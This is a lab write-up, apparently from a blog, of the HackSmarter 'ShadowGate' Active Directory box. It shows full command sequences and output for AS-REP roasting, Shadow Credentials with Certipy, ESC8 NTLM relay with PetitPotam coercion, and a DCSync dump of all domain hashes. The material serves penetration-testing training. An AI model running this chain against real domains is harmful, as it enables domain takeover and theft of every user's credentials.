---
title: "ShadowGate — HackSmarter Pro Labs"
pubDatetime: 2026-09-21T06:17:00Z
draft: false
tags:
  - "HackSmarter"
  - "ShadowGate"
  - "Active Directory"
  - "AS-REP Roasting"
  - "Shadow Credentials"
  - "ADCS"
  - "ESC8"
  - "NTLM Relay"
  - "PetitPotam"
  - "DCSync"
  - "Certipy"
description: "ShadowGate writeup (HackSmarter Pro Labs): anonymous AD enumeration, AS-REP Roasting, Shadow Credentials with Certipy, ESC8 and DCSync."
heroImage: "/assets/images/posts/ShadowGate-HackSmarter/portada.png"
---
## 1. Initial Reconnaissance

We start by verifying connectivity to the target machine. Once confirmed, we export the IP into an environment variable to avoid retyping it on every command:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ ping -c 4 10.1.79.82
PING 10.1.79.82 (10.1.79.82) 56(84) bytes of data.
64 bytes from 10.1.79.82: icmp_seq=1 ttl=126 time=108 ms
64 bytes from 10.1.79.82: icmp_seq=2 ttl=126 time=108 ms
64 bytes from 10.1.79.82: icmp_seq=3 ttl=126 time=108 ms
64 bytes from 10.1.79.82: icmp_seq=4 ttl=126 time=107 ms

--- 10.1.79.82 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 107.443/108.011/108.388/0.353 ms
```

We run a full port scan combining `rustscan` for speed and `nmap` for service fingerprinting:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ rustscan -a 10.1.79.82 --ulimit 1000 -r 1-65535 -- -A -sC -sV -o nmapresult.txt
```

```text
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows AD LDAP (Domain: shadow.gate)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows AD LDAP
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows AD LDAP
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows AD LDAP
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing

Service Info: Host: DC01; OS: Windows
| rdp-ntlm-info:
|   Target_Name: SHADOW
|   DNS_Domain_Name: shadow.gate
|   DNS_Computer_Name: DC01.shadow.gate
|   Product_Version: 10.0.20348
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

> **Ports 53, 88, 389, 445, 636 and 3268 together are the unmistakable fingerprint of a Domain Controller.** The single most valuable detail here: SMB signing is enabled but **not enforced** — this leaves the door open for NTLM relay attacks later in the chain.

We generate the `/etc/hosts` entry directly with NetExec so the domain resolves cleanly:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ nxc smb $IP --generate-hosts-file hosts
SMB  10.1.79.82  445  DC01  [*] Windows Server 2022 Build 20348 x64 (domain:shadow.gate) (signing:False) (DC:True)

┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ cat hosts
10.1.79.82     DC01.shadow.gate shadow.gate DC01
```

We add that line to `/etc/hosts` and export our session variables:

```sh
export IP=10.1.79.82
export DOMAIN=shadow.gate
export FQDN=DC01.shadow.gate
```

---

## 2. Anonymous SMB Enumeration

We probe SMB with a null session and the built-in `guest` account:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ nxc smb $IP -u '' -p ''
SMB  10.1.79.82  445  DC01  [+] shadow.gate\:

┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ nxc smb $IP -u 'guest' -p ''
SMB  10.1.79.82  445  DC01  [-] shadow.gate\guest: STATUS_ACCOUNT_DISABLED
```

The null session authenticates successfully, but share enumeration returns `STATUS_ACCESS_DENIED`. We escalate to `enum4linux-ng` to extract everything possible without credentials:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ enum4linux-ng -A -v 10.1.79.82 2>&1
ENUM4LINUX - next generation (v1.3.10)

[+] LDAP is accessible on 389/tcp
[+] LDAPS is accessible on 636/tcp
[+] SMB is accessible on 445/tcp
[+] Appears to be root/parent DC
[+] Long domain name is: shadow.gate
[+] Server allows authentication via username '' and password ''
[+] Found 12 user(s) via 'querydispinfo'

'1103': username: ATHENA
'1104': username: mbrownlee  (Marcel Brownlee)
'1109': username: bbrown     (Bob Brown)
'1110': username: jtrueblood (James Trueblood)
'1112': username: jsmith     (John Smith)
'1113': username: clocke     (Caroline Locke)
'1114': username: tclarke    (Todd Clarke)
'1115': username: jbradford  (John Bradford)
'1116': username: amoss      (Angela Moss)
'500':  username: Administrator
'501':  username: Guest

[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 8
  Minimum password age: 1 day 4 minutes
  Maximum password age: 365 days
  - DOMAIN_PASSWORD_COMPLEX: false
Domain lockout information:
  Lockout threshold: 10
  Lockout duration: 3 minutes
  Lockout observation window: 3 minutes
```

A single unauthenticated query hands us a goldmine:

| Finding | Tactical Implication |
|---|---|
| 9 domain users enumerated | Wordlist ready for AS-REP Roasting and password spraying |
| Password complexity disabled | Weak passwords highly probable |
| Lockout threshold: 10 attempts | Safe to spray up to 9 attempts per account |
| ADCS-Reader group (RID 1601) | ADCS is deployed in this environment — ESC vulnerabilities likely |
| SMB signing not enforced | NTLM relay viable against SMB services |

---

## 3. AS-REP Roasting — First Credential

With our user list ready, we run AS-REP Roasting. This attack targets accounts where **Kerberos pre-authentication is disabled** (`UF_DONT_REQUIRE_PREAUTH`): the KDC replies with a ticket encrypted with the user's key without verifying who asked for it, letting us capture it and crack it offline.

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ cat > users.txt << 'EOF'
ATHENA
mbrownlee
bbrown
jsmith
clocke
tclarke
jbradford
amoss
jtrueblood
EOF
```

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC

[-] User ATHENA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mbrownlee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bbrown doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User clocke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tclarke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jbradford doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User amoss doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jtrueblood@SHADOW.GATE:8d030b4ee8602440befd901f9612f6fb$7754ec49...87b04a
```

Only `jtrueblood` has pre-authentication disabled. We crack the AS-REP hash offline with `hashcat`:

```sh
iamwin@Jean:~$ hashcat -a 0 -m 18200 asrep_jtrueblood /usr/share/kali-wordlists/rockyou.txt

$krb5asrep$23$jtrueblood@SHADOW.GATE:[...]:blood_brothers

Status: Cracked
Time.Started: Sun Sep 20 18:57:52 2026 (4 secs)
Speed.#01: 2975.9 kH/s @ Accel:1024
Progress: 9584640/14344385 (66.82%)
```

**First credential obtained:**

```
jtrueblood : blood_brothers
```

We validate and enumerate shares:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ nxc smb $FQDN -u jtrueblood -p 'blood_brothers' --shares
SMB  10.1.79.82  445  DC01  [+] shadow.gate\jtrueblood:blood_brothers
SMB  10.1.79.82  445  DC01  Share        Permissions   Remark
SMB  10.1.79.82  445  DC01  CertEnroll   READ          Active Directory Certificate Services share
SMB  10.1.79.82  445  DC01  IPC$         READ          Remote IPC
SMB  10.1.79.82  445  DC01  NETLOGON     READ          Logon server share
SMB  10.1.79.82  445  DC01  SYSVOL       READ          Logon server share
```

The `CertEnroll` share confirms **ADCS is running** on this domain. We take a look inside:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ smbng -H $IP -P 445 -d $DOMAIN -u jtrueblood -p 'blood_brothers'
■[\\10.1.79.82\CertEnroll\]> tree
├── DC01.shadow.gate_shadow-DC01-CA.crt
├── nsrev_shadow-DC01-CA.asp
├── shadow-DC01-CA+.crl
└── shadow-DC01-CA.crl
```

Nothing directly exploitable in the share, but we now know there is an active CA. We move on to enumerate AD object permissions.

---

## 4. Shadow Credentials — Compromising bbrown

We use `bloodyAD` to enumerate objects that `jtrueblood` has write permissions over in Active Directory:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ bloodyAD --host $IP -d $DOMAIN -u jtrueblood -p 'blood_brothers' get writable

distinguishedName: CN=Bob Brown,OU=Technology,OU=Departments,DC=shadow,DC=gate
permission: WRITE

distinguishedName: CN=James Trueblood,OU=Technology,OU=Departments,DC=shadow,DC=gate
permission: WRITE

distinguishedName: DC=shadow.gate,CN=MicrosoftDNS,DC=DomainDnsZones,DC=shadow,DC=gate
permission: CREATE_CHILD
```

`jtrueblood` has **write access over `bbrown`'s AD object**. This opens up two attack paths:

- **Targeted Kerberoasting:** set a fake SPN on `bbrown`, request a TGS and crack it offline.
- **Shadow Credentials:** inject a public key into `bbrown`'s `msDS-KeyCredentialLink` attribute and authenticate as him without ever knowing his password.

We go with **Shadow Credentials** — cleaner and requires no cracking. The technique works by appending a public key we control to the victim's `msDS-KeyCredentialLink` attribute. Kerberos then allows us to request a TGT using the matching certificate via **PKINIT**, and from there we recover the NT hash through **U2U Kerberos**.

We first check whether `bbrown` already has any credential registered:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ certipy shadow list -u jtrueblood@$DOMAIN -p 'blood_brothers' -account bbrown -dc-ip $IP
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'bbrown'
```

No existing `msDS-KeyCredentialLink` entries. We run `shadow auto`, which handles the full cycle automatically — inject the key, authenticate via PKINIT, recover the NT hash, then clean up the injected entry:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ certipy shadow auto -u jtrueblood@$DOMAIN -p 'blood_brothers' -account bbrown -dc-ip $IP
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'bbrown'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '53686b3159964ffc99a798fc14271495'
[*] Adding Key Credential to the Key Credentials for 'bbrown'
[*] Successfully added Key Credential to the Key Credentials for 'bbrown'
[*] Authenticating as 'bbrown' with the certificate
[*] Got TGT
[*] Trying to retrieve NT hash for 'bbrown'
[*] Restoring the old Key Credentials for 'bbrown'
[*] Successfully restored the old Key Credentials for 'bbrown'
[*] NT hash for 'bbrown': 259745cb123a52aa2e693aaacca2db52
```

**Second credential obtained (Pass-the-Hash):**

```
bbrown : 259745cb123a52aa2e693aaacca2db52
```

We validate the hash and check shares:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ nxc smb $FQDN -u bbrown -H 259745cb123a52aa2e693aaacca2db52 --shares
SMB  10.1.79.82  445  DC01  [+] shadow.gate\bbrown:259745cb123a52aa2e693aaacca2db52
SMB  10.1.79.82  445  DC01  Share        Permissions
SMB  10.1.79.82  445  DC01  CertEnroll   READ
SMB  10.1.79.82  445  DC01  NETLOGON     READ
SMB  10.1.79.82  445  DC01  SYSVOL       READ
```

---

## 5. ADCS ESC8 — NTLM Relay to Web Enrollment

With `bbrown`'s credentials, we audit certificate templates using `certipy find`:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ certipy find -u bbrown@shadow.gate -hashes :259745cb123a52aa2e693aaacca2db52 \
    -target shadow.gate -dc-ip $IP -vulnerable -stdout
Certipy v5.1.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                : shadow-DC01-CA
    DNS Name               : DC01.shadow.gate
    Web Enrollment
      HTTP
        Enabled            : True
      HTTPS
        Enabled            : False
    User Specified SAN     : Disabled
    Request Disposition    : Issue
    [!] Vulnerabilities
      ESC8                 : Web Enrollment is enabled over HTTP.
```

**ESC8 confirmed.** What does this mean in practice?

> **ESC8** occurs when the CA exposes the Web Enrollment endpoint (`/certsrv/certfnsh.asp`) over **HTTP without Extended Protection for Authentication (EPA)** and without mandatory NTLM channel binding. This allows an attacker to relay NTLM authentication from any machine toward this endpoint and request a certificate on behalf of the relayed identity — **no password or hash required**.
>
> If we can force the **Domain Controller to authenticate against us** (via a coercion technique), we can relay `DC01$`'s NTLM authentication to the CA and obtain a valid certificate issued to `DC01$`. With that certificate we request a TGT via PKINIT and derive the NT hash of `DC01$` — a machine account that holds full **DCSync** rights over the domain.

We verify the HTTP endpoint is up:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ curl -s -o /dev/null -w "%{http_code}\n" http://DC01.shadow.gate/certsrv/
401
```

`401` confirms the endpoint is alive and waiting for authentication — ideal relay target.

### 5.1 Setting Up the Relay (Certipy)

We open a first terminal and start the relay server. It listens on port 445, catches incoming NTLM connections, relays them to the CA over HTTP and requests a certificate using the `DomainController` template:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ certipy relay -target http://DC01.shadow.gate -ca shadow-DC01-CA -template DomainController -debug
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting http://DC01.shadow.gate/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
```

### 5.2 Coercion via PetitPotam

In a **second terminal**, we force the DC to authenticate against our machine using `PetitPotam`. This exploit abuses the MS-EFSRPC protocol to make any Windows machine initiate an NTLM authentication handshake toward an arbitrary IP.

> **Why does this work?** MS-EFSRPC (Encrypting File System Remote Protocol) exposes RPC functions that internally cause the server to access a UNC path. If that path points to our machine, Windows automatically initiates an NTLM authentication — no user interaction required, no elevated privileges needed on the target.

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ python3 PetitPotam/PetitPotam.py -u bbrown -hashes :259745cb123a52aa2e693aaacca2db52 \
    -d shadow.gate 10.200.97.110 DC01.shadow.gate

Trying pipe lsarpc
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

`EfsRpcOpenFileRaw` is patched (Microsoft addressed it in August 2021), but `EfsRpcEncryptFileSrv` remains unpatched and functional. The coercion succeeded.

Back in our relay terminal, `DC01$` authentication is caught and forwarded to the CA:

```sh
[*] (SMB): Received connection from 10.1.79.82, attacking target http://DC01.shadow.gate
[*] HTTP Request: GET http://dc01.shadow.gate/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[+] HTTP server returned status code 200, treating as successful login
[*] (SMB): Authenticating connection from /@10.1.79.82 against http://DC01.shadow.gate SUCCEED [1]
[+] Generating RSA key
[*] Requesting certificate for '\' based on the template 'DomainController'
[*] Certificate issued with request ID 5
[*] Got certificate with DNS Host Name 'DC01.shadow.gate'
[+] Found SID in security extension: 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Saving certificate and private key to 'dc01.pfx'
[+] Data written to 'dc01.pfx'
```

![Certificate dc01.pfx obtained via ESC8 NTLM Relay](/assets/images/posts/ShadowGate-HackSmarter/img1.png)

The CA, upon receiving the relayed NTLM authentication, genuinely believes it is talking to `DC01$` and **issues a valid certificate in its name** — without asking for any password, trusting solely the NTLM session that arrived. This is the core of ESC8.

---

## 6. From DC01$ to Domain Admin — DCSync

### 6.1 NT Hash of DC01$ via PKINIT

We use the certificate we just obtained to authenticate as `DC01$` and extract its NT hash:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ certipy auth -pfx dc01.pfx -dc-ip $IP
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.shadow.gate'
[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Using principal: 'dc01$@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:853ae6b8c3f0b07b727453c7db71f281
```

### 6.2 DCSync

Every Domain Controller machine account holds `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights over the domain partition — the same permissions DCs use to replicate changes between each other. `secretsdump` leverages these rights to execute a **DCSync**, pulling every credential in the domain directly from Active Directory without ever touching disk on the DC:

```sh
┌──(iamwin㉿0xWin)-[~/Documents/HackSmarter]
└─$ secretsdump.py -just-dc shadow.gate/'dc01$'@$FQDN \
    -hashes aad3b435b51404eeaad3b435b51404ee:853ae6b8c3f0b07b727453c7db71f281
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b5509cbfe52e94940c0ec99b21e09802:::
shadow.gate\ATHENA:1103:aad3b435b51404eeaad3b435b51404ee:3215f4c7c852647c88694ab0b57daaba:::
shadow.gate\mbrownlee:1104:aad3b435b51404eeaad3b435b51404ee:6f16868319543175e7f3e6d4eea9adfb:::
shadow.gate\bbrown:1109:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
shadow.gate\jtrueblood:1110:aad3b435b51404eeaad3b435b51404ee:27e133a345b980d24e3a60f169f2cb7e:::
shadow.gate\jsmith:1112:aad3b435b51404eeaad3b435b51404ee:be0b6d125a6645747d91d30ed3bef98f:::
shadow.gate\clocke:1113:aad3b435b51404eeaad3b435b51404ee:ff506444e2c59b0241812e8e17b0f05e:::
shadow.gate\tclarke:1114:aad3b435b51404eeaad3b435b51404ee:9290a555713c7db0cf7fbf0ac28c1100:::
shadow.gate\jbradford:1115:aad3b435b51404eeaad3b435b51404ee:f5c86043de2a116c6458f3de9aad89de:::
shadow.gate\amoss:1116:aad3b435b51404eeaad3b435b51404ee:381480af4a988ad46758c2f79ee64090:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:853ae6b8c3f0b07b727453c7db71f281:::

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:6bf0048464b8fdf7a2db10f4799715a0c6471ac724424007e95bf55cd6841445
krbtgt:aes256-cts-hmac-sha1-96:9d2c8f2fecd0d6813cde513680b594210cf9c91bc2d4f6715ce25972b6a7c7c5
[*] Cleaning up...
```

**Domain fully compromised.** Administrator NT hash: `4366ec0f86e29be2a4a5e87a1ba922ec`.

---

## 7. Attack Path Summary

```
[Null Session]
    Anonymous enumeration
    9 domain users · no password complexity · lockout threshold 10 · ADCS-Reader group

[AS-REP Roasting]
    jtrueblood → UF_DONT_REQUIRE_PREAUTH
    hashcat + rockyou.txt → blood_brothers

[Shadow Credentials — jtrueblood → bbrown]
    WRITE access over bbrown's AD object
    certipy shadow auto → PKINIT → NT hash bbrown

[ADCS ESC8 — NTLM Relay to HTTP Web Enrollment]
    certipy relay (listener :445)
    PetitPotam coercion → DC01$ NTLM auth toward us
    CA issues dc01.pfx on behalf of DC01$

[PKINIT + DCSync]
    certipy auth → NT hash DC01$
    secretsdump DRSUAPI → all domain hashes
    Domain Compromised
```

---

Thanks for reading — I hope this is useful. If you have any questions, corrections, or just want to talk shop, my socials are linked on this blog.

Closing quote:

> *"The quieter you become, the more you can hear."*
>
> — Ram Dass
